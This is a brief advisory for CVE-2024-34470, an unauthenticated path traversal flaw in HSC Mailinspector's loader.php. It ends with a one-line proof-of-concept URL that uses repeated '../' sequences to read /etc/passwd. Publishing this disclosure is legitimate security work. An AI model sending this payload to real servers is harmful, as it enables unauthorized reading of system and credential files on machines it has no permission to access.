# CVE-2024-34470

**Description:** An Unauthenticated user can abuse Path Traversal vulnerability exists in the `/public/loader.php` file. The `path` parameter does not properly filter whether the file and directory passed are part of the webroot, allowing an attacker to read arbitrary files on the server.

**Versions:** Discovered in HSC Mailinspector 5.2.17-3 but applicable to all versions up to 5.2.18.

## Proof of Concept

By adding `../` to the file path, it's possible to traverse directories and read any files in the operating system with read permission:

> Payload: `/mailinspector/public/loader.php?path=../../../../../../../etc/passwd`
